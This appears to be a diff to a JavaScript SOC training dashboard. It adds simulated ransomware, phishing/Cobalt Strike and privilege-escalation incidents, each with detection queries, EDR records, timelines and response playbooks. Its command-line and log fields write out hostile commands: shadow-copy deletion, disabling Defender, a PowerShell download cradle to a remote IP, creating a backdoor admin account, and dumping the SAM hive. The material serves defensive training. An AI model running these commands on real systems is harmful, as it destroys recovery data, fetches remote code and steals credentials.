@@ -266,6 +266,402 @@ const socScenarios = {
         ],
         risk: { score: 82, confidence: 'High' },
     },
+    'ransomware-execution': {
+        alert: {
+            rule: 'Ransomware Pre-Encryption Behavior Detected',
+            severity: 'Critical',
+            host: 'WIN-FS01-PROD',
+            user: 'svc_deploy',
+            srcIp: '10.0.2.18',
+            status: 'Active',
+            technique: 'T1486',
+        },
+        caseInfo: {
+            id: 'SOC-2026-0050',
+            status: 'Open',
+            analyst: 'Analyst-1 (Tier 3)',
+            priority: 'P1 — Critical',
+        },
+        summary: 'Service account svc_deploy on file server WIN-FS01-PROD executed vssadmin to delete shadow copies, disabled Windows Defender via PowerShell, then launched a LockBit 3.0 binary that began mass file encryption across SMB shares. 847 files encrypted in the first 90 seconds with .lockbit extension appended. Ransom note dropped in every directory.',
+        mitre: [
+            { technique: 'T1486', name: 'Data Encrypted for Impact', tactic: 'Impact' },
+            { technique: 'T1490', name: 'Inhibit System Recovery', tactic: 'Impact' },
+            { technique: 'T1562.001', name: 'Impair Defenses: Disable or Modify Tools', tactic: 'Defense Evasion' },
+            { technique: 'T1489', name: 'Service Stop', tactic: 'Impact' },
+        ],
+        siem: {
+            sources: ['Windows Security (4688)', 'Sysmon (Event 1, 11, 23)', 'Windows Defender (5001)', 'VSS Admin Logs'],
+            logic: 'Detect vssadmin.exe shadow copy deletion followed by mass file rename operations (>100 files/min) with new extension. Correlate with Defender disabled events.',
+            splunk: `index=windows sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
+(EventCode=1 Image="*vssadmin.exe" CommandLine="*delete*shadows*")
+OR (EventCode=1 Image="*wmic.exe" CommandLine="*shadowcopy*delete*")
+OR (EventCode=23 TargetFilename="*.lockbit" | stats count as encrypted_files by Computer
+    | where encrypted_files > 50)
+| stats values(Image) as processes, count by Computer, User
+| table _time Computer User processes count`,
+            kql: `DeviceProcessEvents
+| where (FileName =~ "vssadmin.exe" and ProcessCommandLine has_all ("delete","shadows"))
+    or (FileName =~ "wmic.exe" and ProcessCommandLine has_all ("shadowcopy","delete"))
+| union (
+    DeviceFileEvents
+    | where ActionType == "FileRenamed"
+    | where FileName endswith ".lockbit"
+    | summarize EncryptedFiles = count() by DeviceName, bin(Timestamp, 1m)
+    | where EncryptedFiles > 50
+)
+| project Timestamp, DeviceName, FileName, ProcessCommandLine`,
+        },
+        edr: {
+            process: [
+                'vssadmin.exe delete shadows /all /quiet — shadow copy destruction',
+                'powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true',
+                'lockbit3.exe mass file encryption across SMB shares',
+                'notepad.exe opened !!!-Restore-My-Files-!!!.txt (ransom note display)',
+            ],
+            cmdline: [
+                'vssadmin.exe delete shadows /all /quiet',
+                'wmic shadowcopy delete /nointeractive',
+                'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"',
+                'C:\\Temp\\lockbit3.exe --encrypt-all --skip-system',
+            ],
+            parentChild: [
+                { parent: 'cmd.exe', child: 'vssadmin.exe', note: 'Shadow copy deletion' },
+                { parent: 'cmd.exe', child: 'powershell.exe', note: 'Defender disabled' },
+                { parent: 'cmd.exe', child: 'lockbit3.exe', note: 'Ransomware execution' },
+                { parent: 'lockbit3.exe', child: 'notepad.exe', note: 'Ransom note display' },
+            ],
+            ioa: [
+                { pattern: 'VSS Shadow Copy Deletion', severity: 'Critical', action: 'Prevent + Kill' },
+                { pattern: 'Mass File Rename with New Extension', severity: 'Critical', action: 'Prevent + Kill' },
+                { pattern: 'Defender Real-Time Protection Disabled', severity: 'High', action: 'Detect + Alert' },
+            ],
+            ioc: {
+                ips: ['203.0.113.99', '198.51.100.42'],
+                domains: ['lockbit-decryptor[.]onion', 'payment-gate[.]xyz'],
+                hashes: ['d4e8f1a2...b7c9e3d5 (lockbit3.exe)', 'a2b4c6d8...e0f1a3b5 (ransom_note.hta)'],
+                paths: ['C:\\Temp\\lockbit3.exe', 'C:\\Users\\svc_deploy\\Desktop\\!!!-Restore-My-Files-!!!.txt', 'C:\\ProgramData\\lockbit_config.json'],
+            },
+        },
+        xdr: {
+            identity: 'svc_deploy — Service account, local admin on file servers, password last changed 240 days ago',
+            endpoint: 'WIN-FS01-PROD — File server, 847 files encrypted in 90s, VSS deleted, Defender disabled',
+            network: 'SMB share access from WIN-FS01-PROD to 4 file shares, outbound to lockbit-decryptor[.]onion via Tor',
+            chain: [
+                { stage: 'Defense Evasion', detail: 'Defender disabled + VSS shadow copies deleted', status: 'confirmed' },
+                { stage: 'Execution', detail: 'LockBit 3.0 binary launched with --encrypt-all flag', status: 'confirmed' },
+                { stage: 'Impact', detail: '847 files encrypted (.lockbit) across 4 SMB shares', status: 'active' },
+                { stage: 'Exfiltration', detail: 'Potential data theft pre-encryption (double extortion)', status: 'pending' },
+            ],
+        },
+        timeline: [
+            { time: '2026-04-03 03:14:00', event: 'svc_deploy logged in to WIN-FS01-PROD via RDP', type: 'info' },
+            { time: '2026-04-03 03:15:22', event: 'vssadmin.exe delete shadows /all /quiet executed', type: 'critical' },
+            { time: '2026-04-03 03:15:45', event: 'Set-MpPreference -DisableRealtimeMonitoring $true', type: 'critical' },
+            { time: '2026-04-03 03:16:01', event: 'lockbit3.exe launched — encryption started', type: 'critical' },
+            { time: '2026-04-03 03:17:31', event: '847 files renamed to .lockbit extension in 90 seconds', type: 'critical' },
+            { time: '2026-04-03 03:17:35', event: 'Ransom note !!!-Restore-My-Files-!!!.txt dropped in all directories', type: 'suspicious' },
+        ],
+        logs: [
+            { id: 1, text: '[03:14:00] EventID 4624 — Logon: svc_deploy (Type 10 RDP) from 10.0.1.15', type: 'normal' },
+            { id: 2, text: '[03:15:22] EventID 4688 — Process: vssadmin.exe "delete shadows /all /quiet"', type: 'critical' },
+            { id: 3, text: '[03:15:30] EventID 4688 — Process: wmic.exe "shadowcopy delete /nointeractive"', type: 'critical' },
+            { id: 4, text: '[03:15:45] Defender 5001 — Real-time protection disabled by svc_deploy', type: 'critical' },
+            { id: 5, text: '[03:16:01] Sysmon 1 — ProcessCreate: C:\\Temp\\lockbit3.exe (unsigned, PID 6720)', type: 'critical' },
+            { id: 6, text: '[03:16:05] Sysmon 11 — FileCreate: *.lockbit (847 events in 90s)', type: 'critical' },
+            { id: 7, text: '[03:17:35] Sysmon 11 — FileCreate: !!!-Restore-My-Files-!!!.txt', type: 'suspicious' },
+            { id: 8, text: '[03:18:00] Network — Outbound TOR connection to lockbit-decryptor[.]onion', type: 'suspicious' },
+        ],
+        soar: {
+            trigger: 'VSS shadow copy deletion + mass file rename (>100 files/min) with uniform new extension',
+            actions: [
+                { action: 'Isolate WIN-FS01-PROD from network immediately', type: 'isolate', status: 'pending' },
+                { action: 'Kill process lockbit3.exe (PID 6720)', type: 'kill', status: 'pending' },
+                { action: 'Disable AD account svc_deploy', type: 'disable', status: 'pending' },
+                { action: 'Block TOR exit nodes on perimeter firewall', type: 'block', status: 'pending' },
+                { action: 'Snapshot/isolate connected file shares', type: 'isolate', status: 'pending' },
+            ],
+        },
+        detection: {
+            threshold: 'vssadmin shadow delete + ≥ 100 file renames/min with uniform extension',
+            timeWindow: '2-minute correlation window',
+        },
+        falsePositives: [
+            'IT admin performing legitimate VSS cleanup (rare, must be change-ticketed)',
+            'Backup software rotating shadow copies (whitelist by process hash)',
+            'Mass file migration with extension changes (correlate with change management)',
+        ],
+        tuning: [
+            'Whitelist approved backup tools (Veeam, Commvault) from VSS deletion rule',
+            'Add canary file detection — plant decoy files in shares and alert on rename',
+            'Lower threshold to 50 files/min for high-value file servers',
+            'Correlate with Defender disable event for higher-confidence detection',
+        ],
+        risk: { score: 99, confidence: 'High' },
+    },
+    'phishing-c2': {
+        alert: {
+            rule: 'Phishing Payload — C2 Callback Detected',
+            severity: 'High',
+            host: 'WS-MKT-022',
+            user: 'j.martinez',
+            srcIp: '10.0.8.22',
+            status: 'Active',
+            technique: 'T1566.001',
+        },
+        caseInfo: {
+            id: 'SOC-2026-0051',
+            status: 'Open',
+            analyst: 'Analyst-2 (Tier 1)',
+            priority: 'P2 — High',
+        },
+        summary: 'User j.martinez opened a phishing email containing a macro-enabled Word document (Invoice_April.docm). The macro spawned cmd.exe which launched PowerShell with an encoded download cradle pulling a Cobalt Strike stager from 45.77.65.211. The beacon established HTTPS C2 communication on port 443 with a 60-second sleep interval and 25% jitter.',
+        mitre: [
+            { technique: 'T1566.001', name: 'Phishing: Spearphishing Attachment', tactic: 'Initial Access' },
+            { technique: 'T1059.001', name: 'Command & Scripting: PowerShell', tactic: 'Execution' },
+            { technique: 'T1071.001', name: 'Application Layer Protocol: Web', tactic: 'Command and Control' },
+            { technique: 'T1105', name: 'Ingress Tool Transfer', tactic: 'Command and Control' },
+        ],
+        siem: {
+            sources: ['Exchange Message Tracking', 'PowerShell (4104)', 'Sysmon (Event 1, 3)', 'Proxy/Firewall Logs'],
+            logic: 'Detect Office process (WINWORD/EXCEL) spawning cmd.exe or powershell.exe, followed by outbound HTTPS to uncategorized/newly registered domain within 60 seconds.',
+            splunk: `index=windows sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1
+| where match(ParentImage, "(?i)(winword|excel|powerpnt)\\.exe$")
+| where match(Image, "(?i)(cmd|powershell|pwsh)\\.exe$")
+| join Computer
+  [ search index=proxy action=allowed category="uncategorized"
+    | stats count by src_ip, dest_ip, dest_host ]
+| table _time Computer User ParentImage Image CommandLine dest_host`,
+            kql: `DeviceProcessEvents
+| where InitiatingProcessFileName in~ ("WINWORD.EXE","EXCEL.EXE","POWERPNT.EXE")
+| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe")
+| join kind=inner (
+    DeviceNetworkEvents
+    | where RemotePort == 443
+    | where Timestamp > ago(5m)
+  ) on DeviceId
+| project Timestamp, DeviceName, AccountName,
+          InitiatingProcessFileName, FileName, ProcessCommandLine, RemoteIP`,
+        },
+        edr: {
+            process: [
+                'WINWORD.EXE opened Invoice_April.docm with macro auto-execute',
+                'cmd.exe spawned by WINWORD.EXE — macro payload delivery',
+                'powershell.exe -enc executed download cradle for Cobalt Strike stager',
+                'rundll32.exe loaded beacon DLL — HTTPS C2 established',
+            ],
+            cmdline: [
+                'cmd.exe /c powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...',
+                'powershell.exe IEX(New-Object Net.WebClient).DownloadString("https://45.77.65.211/beacon.ps1")',
+                'rundll32.exe C:\\Users\\j.martinez\\AppData\\Local\\Temp\\beacon.dll,Start',
+            ],
+            parentChild: [
+                { parent: 'WINWORD.EXE', child: 'cmd.exe', note: 'Macro execution' },
+                { parent: 'cmd.exe', child: 'powershell.exe', note: 'Encoded download cradle' },
+                { parent: 'powershell.exe', child: 'rundll32.exe', note: 'Beacon DLL sideload' },
+                { parent: 'rundll32.exe', child: 'HTTPS C2', note: '60s sleep / 25% jitter' },
+            ],
+            ioa: [
+                { pattern: 'Office Application Spawning Shell Process', severity: 'High', action: 'Detect + Alert' },
+                { pattern: 'Encoded PowerShell Download Cradle', severity: 'Critical', action: 'Prevent + Kill' },
+                { pattern: 'Cobalt Strike Beacon HTTPS Callback', severity: 'Critical', action: 'Prevent + Kill' },
+            ],
+            ioc: {
+                ips: ['45.77.65.211', '104.248.52.18'],
+                domains: ['cdn-update-service[.]com', 'static-assets-dl[.]xyz'],
+                hashes: ['f1e2d3c4...a5b6c7d8 (Invoice_April.docm)', 'b8a9c0d1...e2f3a4b5 (beacon.dll)'],
+                paths: ['C:\\Users\\j.martinez\\Downloads\\Invoice_April.docm', 'C:\\Users\\j.martinez\\AppData\\Local\\Temp\\beacon.dll'],
+            },
+        },
+        xdr: {
+            identity: 'j.martinez — Marketing dept, standard user, MFA enabled, no admin rights',
+            endpoint: 'WS-MKT-022 — Workstation, Cobalt Strike beacon active, HTTPS C2 established',
+            network: 'Outbound HTTPS to 45.77.65.211:443 (Vultr VPS), 60s beacon interval, JA3 match for CS 4.x',
+            chain: [
+                { stage: 'Initial Access', detail: 'Phishing .docm opened — macro auto-executed', status: 'confirmed' },
+                { stage: 'Execution', detail: 'PowerShell encoded download cradle for CS stager', status: 'confirmed' },
+                { stage: 'Command & Control', detail: 'Cobalt Strike HTTPS beacon — 60s/25% jitter', status: 'active' },
+                { stage: 'Actions on Objective', detail: 'Pending — no lateral movement or exfil yet', status: 'pending' },
+            ],
+        },
+        timeline: [
+            { time: '2026-04-03 10:42:00', event: 'Phishing email from spoofed-vendor@invoice-portal[.]com delivered', type: 'info' },
+            { time: '2026-04-03 10:44:15', event: 'j.martinez opened Invoice_April.docm — macro executed', type: 'suspicious' },
+            { time: '2026-04-03 10:44:18', event: 'cmd.exe spawned by WINWORD.EXE', type: 'suspicious' },
+            { time: '2026-04-03 10:44:22', event: 'PowerShell -enc download cradle to 45.77.65.211', type: 'critical' },
+            { time: '2026-04-03 10:44:30', event: 'beacon.dll written to %TEMP% and loaded via rundll32.exe', type: 'critical' },
+            { time: '2026-04-03 10:45:30', event: 'First HTTPS C2 callback to 45.77.65.211:443 (JA3: a0e9f5d6...)', type: 'critical' },
+        ],
+        logs: [
+            { id: 1, text: '[10:42:00] Exchange — Inbound email from spoofed-vendor@invoice-portal[.]com to j.martinez', type: 'normal' },
+            { id: 2, text: '[10:44:15] EventID 4688 — Process: WINWORD.EXE opened Invoice_April.docm', type: 'normal' },
+            { id: 3, text: '[10:44:18] Sysmon 1 — cmd.exe spawned by WINWORD.EXE (PID 3840)', type: 'suspicious' },
+            { id: 4, text: '[10:44:22] EventID 4104 — ScriptBlock: IEX(New-Object Net.WebClient).DownloadString(...)', type: 'critical' },
+            { id: 5, text: '[10:44:30] Sysmon 11 — FileCreate: C:\\Users\\j.martinez\\AppData\\Local\\Temp\\beacon.dll', type: 'critical' },
+            { id: 6, text: '[10:44:32] Sysmon 1 — rundll32.exe loaded beacon.dll (PID 7204)', type: 'critical' },
+            { id: 7, text: '[10:45:30] Proxy — HTTPS to 45.77.65.211:443 (uncategorized, JA3 match: Cobalt Strike)', type: 'critical' },
+            { id: 8, text: '[10:46:30] Proxy — Repeat HTTPS beacon at 60s interval (C2 confirmed)', type: 'suspicious' },
+        ],
+        soar: {
+            trigger: 'Office process → shell process → outbound HTTPS to uncategorized domain within 120 seconds',
+            actions: [
+                { action: 'Isolate WS-MKT-022 from network', type: 'isolate', status: 'pending' },
+                { action: 'Kill rundll32.exe PID 7204 (beacon)', type: 'kill', status: 'pending' },
+                { action: 'Block IP 45.77.65.211 on proxy and firewall', type: 'block', status: 'pending' },
+                { action: 'Quarantine Invoice_April.docm via email gateway', type: 'block', status: 'pending' },
+                { action: 'Reset j.martinez credentials (precautionary)', type: 'disable', status: 'pending' },
+            ],
+        },
+        detection: {
+            threshold: 'Office → shell spawn + outbound uncategorized HTTPS within 120 seconds',
+            timeWindow: '2-minute correlation window',
+        },
+        falsePositives: [
+            'Legitimate Office add-ins spawning helper processes (whitelist by publisher cert)',
+            'IT scripts launched via Excel macros for reporting (approved macro list)',
+            'Office repair/update spawning child processes (match Microsoft signature)',
+        ],
+        tuning: [
+            'Whitelist approved macro-enabled documents by SHA256 hash',
+            'Add JA3/JA3S fingerprint matching for known C2 frameworks (CS, Sliver, Mythic)',
+            'Correlate with email gateway verdict — auto-escalate if attachment was not sandboxed',
+            'Suppress alerts for signed child processes from trusted publishers',
+        ],
+        risk: { score: 85, confidence: 'High' },
+    },
+    'privilege-escalation': {
+        alert: {
+            rule: 'Local Privilege Escalation via Service Exploitation',
+            severity: 'High',
+            host: 'WS-DEV-031',
+            user: 'dev.contractor',
+            srcIp: '10.0.12.31',
+            status: 'Active',
+            technique: 'T1068',
+        },
+        caseInfo: {
+            id: 'SOC-2026-0052',
+            status: 'Open',
+            analyst: 'Analyst-4 (Tier 2)',
+            priority: 'P2 — High',
+        },
+        summary: 'Developer contractor account dev.contractor on WS-DEV-031 exploited a vulnerable Windows service (unquoted service path in LegacyAppSvc) to achieve SYSTEM-level privilege escalation. Post-escalation, the attacker created a new local admin account "support_admin", dumped SAM database hashes, and established persistence via a WMI event subscription.',
+        mitre: [
+            { technique: 'T1068', name: 'Exploitation for Privilege Escalation', tactic: 'Privilege Escalation' },
+            { technique: 'T1574.009', name: 'Hijack Execution Flow: Unquoted Service Path', tactic: 'Persistence' },
+            { technique: 'T1136.001', name: 'Create Account: Local Account', tactic: 'Persistence' },
+            { technique: 'T1003.002', name: 'OS Credential Dumping: SAM', tactic: 'Credential Access' },
+        ],
+        siem: {
+            sources: ['Windows Security (4688, 4720, 4732)', 'Sysmon (Event 1, 13, 19)', 'Windows System (7045)'],
+            logic: 'Detect non-admin user spawning process as SYSTEM via service exploitation, followed by net user /add or SAM registry access within 5-minute window.',
+            splunk: `index=windows
+(EventCode=4688 TokenElevationType="%%1937" SubjectUserName!="SYSTEM"
+  SubjectUserName!="LOCAL SERVICE")
+OR (EventCode=4720 TargetUserName="support_admin")
+OR (EventCode=7045 ServiceName="LegacyAppSvc")
+OR (EventCode=4688 CommandLine="*reg*save*sam*")
+| stats values(EventCode) as events, values(CommandLine) as cmds by Computer, SubjectUserName
+| where mvcount(events) >= 2
+| table _time Computer SubjectUserName events cmds`,
+            kql: `union
+  (SecurityEvent | where EventID == 4688
+    and TokenElevationType == "%%1937"
+    and SubjectUserName !in ("SYSTEM","LOCAL SERVICE")),
+  (SecurityEvent | where EventID == 4720
+    and TargetUserName == "support_admin"),
+  (DeviceProcessEvents | where ProcessCommandLine has_all ("reg","save","sam"))
+| project Timestamp, Computer, SubjectUserName, EventID, ProcessCommandLine
+| sort by Timestamp asc`,
+        },
+        edr: {
+            process: [
+                'sc.exe query LegacyAppSvc — enumerated vulnerable service',
+                'Planted malicious binary in unquoted service path',
+                'Service restarted — SYSTEM shell obtained via hijack',
+                'net.exe user support_admin P@ss123! /add — local admin created',
+                'reg.exe save HKLM\\SAM C:\\Temp\\sam.save — SAM dump',
+            ],
+            cmdline: [
+                'sc.exe qc LegacyAppSvc (ImagePath: C:\\Program Files\\Legacy App\\Service.exe — unquoted)',
+                'copy payload.exe "C:\\Program Files\\Legacy.exe"',
+                'sc.exe stop LegacyAppSvc && sc.exe start LegacyAppSvc',
+                'net user support_admin P@ss123! /add && net localgroup Administrators support_admin /add',
+                'reg save HKLM\\SAM C:\\Temp\\sam.save && reg save HKLM\\SYSTEM C:\\Temp\\sys.save',
+            ],
+            parentChild: [
+                { parent: 'cmd.exe (dev.contractor)', child: 'sc.exe', note: 'Service enumeration' },
+                { parent: 'services.exe (SYSTEM)', child: 'Legacy.exe', note: 'Hijacked service execution' },
+                { parent: 'Legacy.exe (SYSTEM)', child: 'cmd.exe', note: 'SYSTEM shell obtained' },
+                { parent: 'cmd.exe (SYSTEM)', child: 'net.exe', note: 'Admin account creation' },
+            ],
+            ioa: [
+                { pattern: 'Non-Admin User Gaining SYSTEM via Service Exploit', severity: 'Critical', action: 'Prevent + Kill' },
+                { pattern: 'Local Admin Account Creation by Non-Admin', severity: 'High', action: 'Detect + Alert' },
+                { pattern: 'SAM Registry Hive Export', severity: 'Critical', action: 'Prevent + Kill' },
+            ],
+            ioc: {
+                ips: ['10.0.12.31 (source workstation)'],
+                domains: ['N/A — Local exploitation, no external C2'],
+                hashes: ['c3d4e5f6...a7b8c9d0 (Legacy.exe — malicious payload)', '1a2b3c4d...e5f6a7b8 (payload.exe — original dropper)'],
+                paths: ['C:\\Program Files\\Legacy.exe', 'C:\\Temp\\sam.save', 'C:\\Temp\\sys.save', 'C:\\Users\\dev.contractor\\payload.exe'],
+            },
+        },
+        xdr: {
+            identity: 'dev.contractor — External contractor, standard user, no admin rights, dev workstation only',
+            endpoint: 'WS-DEV-031 — Developer workstation, SYSTEM escalation achieved, SAM dumped, new admin created',
+            network: 'No external C2 — local privilege escalation only (lateral movement likely next)',
+            chain: [
+                { stage: 'Discovery', detail: 'Enumerated services — found unquoted path in LegacyAppSvc', status: 'confirmed' },
+                { stage: 'Privilege Escalation', detail: 'Exploited unquoted service path → SYSTEM shell', status: 'confirmed' },
+                { stage: 'Persistence', detail: 'Created local admin support_admin + WMI subscription', status: 'active' },
+                { stage: 'Credential Access', detail: 'SAM/SYSTEM hive dumped for offline cracking', status: 'active' },
+            ],
+        },
+        timeline: [
+            { time: '2026-04-03 16:05:00', event: 'dev.contractor logged into WS-DEV-031 (standard user session)', type: 'info' },
+            { time: '2026-04-03 16:12:30', event: 'sc.exe qc LegacyAppSvc — service path enumeration', type: 'suspicious' },
+            { time: '2026-04-03 16:14:00', event: 'Malicious Legacy.exe placed in C:\\Program Files\\', type: 'critical' },
+            { time: '2026-04-03 16:14:45', event: 'LegacyAppSvc restarted — SYSTEM shell obtained', type: 'critical' },
+            { time: '2026-04-03 16:15:20', event: 'net user support_admin created and added to Administrators', type: 'critical' },
+            { time: '2026-04-03 16:16:05', event: 'reg save HKLM\\SAM and HKLM\\SYSTEM exported to C:\\Temp\\', type: 'critical' },
+        ],
+        logs: [
+            { id: 1, text: '[16:05:00] EventID 4624 — Logon: dev.contractor (Type 2 Interactive)', type: 'normal' },
+            { id: 2, text: '[16:12:30] EventID 4688 — Process: sc.exe "qc LegacyAppSvc" by dev.contractor', type: 'suspicious' },
+            { id: 3, text: '[16:14:00] Sysmon 11 — FileCreate: C:\\Program Files\\Legacy.exe (unsigned)', type: 'critical' },
+            { id: 4, text: '[16:14:45] EventID 7045 — Service Installed: LegacyAppSvc restarted (SYSTEM)', type: 'critical' },
+            { id: 5, text: '[16:15:20] EventID 4720 — User Account Created: support_admin by SYSTEM', type: 'critical' },
+            { id: 6, text: '[16:15:25] EventID 4732 — Member Added to Administrators: support_admin', type: 'critical' },
+            { id: 7, text: '[16:16:05] EventID 4688 — Process: reg.exe "save HKLM\\SAM C:\\Temp\\sam.save"', type: 'critical' },
+            { id: 8, text: '[16:16:10] Sysmon 13 — RegistryValueSet: WMI EventSubscription persistence', type: 'suspicious' },
+        ],
+        soar: {
+            trigger: 'Non-admin user achieving SYSTEM token + local admin account creation within 5-minute window',
+            actions: [
+                { action: 'Isolate WS-DEV-031 from network', type: 'isolate', status: 'pending' },
+                { action: 'Kill SYSTEM cmd.exe shell process', type: 'kill', status: 'pending' },
+                { action: 'Delete local account support_admin', type: 'disable', status: 'pending' },
+                { action: 'Disable dev.contractor AD account', type: 'disable', status: 'pending' },
+                { action: 'Remove WMI persistence subscription', type: 'kill', status: 'pending' },
+            ],
+        },
+        detection: {
+            threshold: 'Non-admin → SYSTEM token elevation + net user /add within 5 minutes',
+            timeWindow: '5-minute correlation window',
+        },
+        falsePositives: [
+            'Software installer running as SYSTEM during scheduled deployment (correlate with SCCM)',
+            'Admin using runas /user:SYSTEM for troubleshooting (verify via ticketing system)',
+            'Group Policy applying service configurations (whitelist GP engine processes)',
+        ],
+        tuning: [
+            'Whitelist known installers and SCCM task sequences by parent process + hash',
+            'Add unquoted service path detection as a proactive vulnerability scanner',
+            'Correlate with HR database — flag if contractor account performs admin-level actions',
+            'Alert on any net user /add regardless of privilege level in sensitive segments',
+        ],
+        risk: { score: 88, confidence: 'High' },
+    },
     'dns-tunneling': {
         alert: {
             rule: 'DNS Tunneling — High-Frequency Encoded Queries',
@@ -585,6 +981,31 @@ function loadSOCWorkflow() {
         .sw-exec-all:hover { transform:translateY(-1px); box-shadow:0 6px 25px rgba(34,211,238,0.35); }
         .sw-exec-all:disabled { opacity:0.5; cursor:not-allowed; transform:none; }
 
+        .sw-view-toggle { display:flex; gap:8px; margin-bottom:20px; }
+        .sw-view-btn {
+            padding:8px 18px; border:1px solid var(--border); border-radius:6px;
+            background:var(--bg-card); color:var(--text-secondary); font-size:12px;
+            font-weight:600; cursor:pointer; font-family:inherit; transition:all 0.15s;
+        }
+        .sw-view-btn:hover { border-color:var(--accent); color:var(--accent); }
+        .sw-view-btn.active { background:rgba(34,211,238,0.1); border-color:#22d3ee; color:#22d3ee; }
+        .sw-json-view {
+            background:#0d1117; border:1px solid var(--border); border-radius:10px;
+            padding:20px; font-family:var(--font-mono); font-size:12px; line-height:1.6;
+            color:#c9d1d9; overflow:auto; max-height:75vh; white-space:pre; position:relative;
+        }
+        .sw-json-copy {
+            position:sticky; top:0; float:right; padding:6px 14px; border:1px solid var(--border);
+            border-radius:6px; background:rgba(17,24,39,0.95); color:#22d3ee; font-size:11px;
+            font-weight:700; cursor:pointer; font-family:inherit; transition:all 0.15s; z-index:2;
+        }
+        .sw-json-copy:hover { background:#22d3ee; color:#0d1117; }
+        .sw-json-key { color:#7ee787; }
+        .sw-json-str { color:#a5d6ff; }
+        .sw-json-num { color:#f8a4b8; }
+        .sw-json-bool { color:#ff7b72; }
+        .sw-json-null { color:#6e7681; }
+
         @media (max-width:768px) {
             .sw-grid-2, .sw-grid-3, .sw-xdr-cards { grid-template-columns:1fr; }
             .sw-chain { flex-direction:column; }
@@ -609,10 +1030,19 @@ function loadSOCWorkflow() {
         <div class="sw-scenario-bar" id="sw-scenario-bar">
             <button class="sw-scenario-btn active" onclick="swLoadScenario('credential-dumping')">Credential Dumping (LSASS)</button>
             <button class="sw-scenario-btn" onclick="swLoadScenario('brute-force-rdp')">RDP Brute Force</button>
+            <button class="sw-scenario-btn" onclick="swLoadScenario('ransomware-execution')">Ransomware (LockBit)</button>
+            <button class="sw-scenario-btn" onclick="swLoadScenario('phishing-c2')">Phishing C2 Callback</button>
+            <button class="sw-scenario-btn" onclick="swLoadScenario('privilege-escalation')">Privilege Escalation</button>
             <button class="sw-scenario-btn" onclick="swLoadScenario('dns-tunneling')">DNS Tunneling (Exfil)</button>
         </div>
 
+        <div class="sw-view-toggle">
+            <button class="sw-view-btn active" id="sw-view-ui" onclick="swSwitchView('ui')">Dashboard View</button>
+            <button class="sw-view-btn" id="sw-view-json" onclick="swSwitchView('json')">JSON Export</button>
+        </div>
+
         <div id="sw-workflow-body"></div>
+        <div id="sw-json-body" style="display:none"></div>
     </div>
     `;
 
@@ -909,5 +1339,131 @@ function swExecuteAll() {
     const total = window._swCurrentScenario?.soar.actions.length || 0;
     for (let i = 0; i < total; i++) {
         setTimeout(() => swExecuteAction(i), i * 400);
+    }
+}
+
+// ── JSON Schema Export ──
+function swToJSON(s) {
+    return {
+        alert: {
+            rule_name: s.alert.rule,
+            severity: s.alert.severity,
+            host: s.alert.host,
+            user: s.alert.user,
+            source_ip: s.alert.srcIp,
+            status: s.alert.status,
+        },
+        case: {
+            case_id: s.caseInfo.id,
+            status: s.caseInfo.status,
+            analyst: s.caseInfo.analyst,
+            priority: s.caseInfo.priority,
+        },
+        incident_summary: s.summary,
+        mitre: s.mitre.map(m => ({ technique: m.technique, name: m.name, tactic: m.tactic })),
+        siem: {
+            log_sources: s.siem.sources,
+            logic: s.siem.logic,
+            splunk: s.siem.splunk.trim(),
+            kql: s.siem.kql.trim(),
+        },
+        edr: {
+            process_behavior: s.edr.process,
+            command_line: s.edr.cmdline,
+            parent_child: s.edr.parentChild.map(p => `${p.parent} → ${p.child} (${p.note})`),
+            ioa: s.edr.ioa.map(i => ({ pattern: i.pattern, severity: i.severity, action: i.action })),
+            ioc: {
+                ip: s.edr.ioc.ips,
+                domain: s.edr.ioc.domains,
+                hash: s.edr.ioc.hashes,
+                file_path: s.edr.ioc.paths,
+            },
+        },
+        xdr: {
+            correlation: [
+                `Identity: ${s.xdr.identity}`,
+                `Endpoint: ${s.xdr.endpoint}`,
+                `Network: ${s.xdr.network}`,
+            ],
+            attack_chain: s.xdr.chain.map(c => ({ stage: c.stage, detail: c.detail, status: c.status })),
+        },
+        timeline: s.timeline.map(t => ({ time: t.time, event: t.event, type: t.type })),
+        logs: s.logs.map(l => ({ entry: l.text, level: l.type })),
+        soar: {
+            trigger: s.soar.trigger,
+            actions: s.soar.actions.map(a => a.action),
+        },
+        response_status: s.soar.actions.map(a => `${a.action} (simulated)`),
+        conditions: {
+            threshold: s.detection.threshold,
+            time_window: s.detection.timeWindow,
+        },
+        false_positives: s.falsePositives,
+        tuning: s.tuning,
+        risk: {
+            score: s.risk.score,
+            confidence: s.risk.confidence,
+        },
+    };
+}
+
+function swSyntaxHighlight(json) {
+    const str = JSON.stringify(json, null, 2);
+    return str.replace(/("(\\u[a-fA-F0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?|\bnull\b)/g, (match) => {
+        if (/^"/.test(match)) {
+            if (/:$/.test(match)) {
+                return `<span class="sw-json-key">${match}</span>`;
+            }
+            return `<span class="sw-json-str">${match}</span>`;
+        }
+        if (/true|false/.test(match)) return `<span class="sw-json-bool">${match}</span>`;
+        if (/null/.test(match)) return `<span class="sw-json-null">${match}</span>`;
+        return `<span class="sw-json-num">${match}</span>`;
+    });
+}
+
+function swRenderJSON() {
+    const s = window._swCurrentScenario;
+    if (!s) return;
+    const json = swToJSON(s);
+    const jsonBody = document.getElementById('sw-json-body');
+    if (!jsonBody) return;
+
+    jsonBody.innerHTML = `
+        <div class="sw-json-view">
+            <button class="sw-json-copy" onclick="swCopyJSON()">COPY JSON</button>
+            ${swSyntaxHighlight(json)}
+        </div>
+    `;
+}
+
+function swCopyJSON() {
+    const s = window._swCurrentScenario;
+    if (!s) return;
+    const json = swToJSON(s);
+    navigator.clipboard.writeText(JSON.stringify(json, null, 2)).then(() => {
+        const btn = document.querySelector('.sw-json-copy');
+        if (btn) { btn.textContent = '✔ COPIED'; setTimeout(() => { btn.textContent = 'COPY JSON'; }, 2000); }
+    });
+}
+
+function swSwitchView(view) {
+    const uiBody = document.getElementById('sw-workflow-body');
+    const jsonBody = document.getElementById('sw-json-body');
+    const uiBtn = document.getElementById('sw-view-ui');
+    const jsonBtn = document.getElementById('sw-view-json');
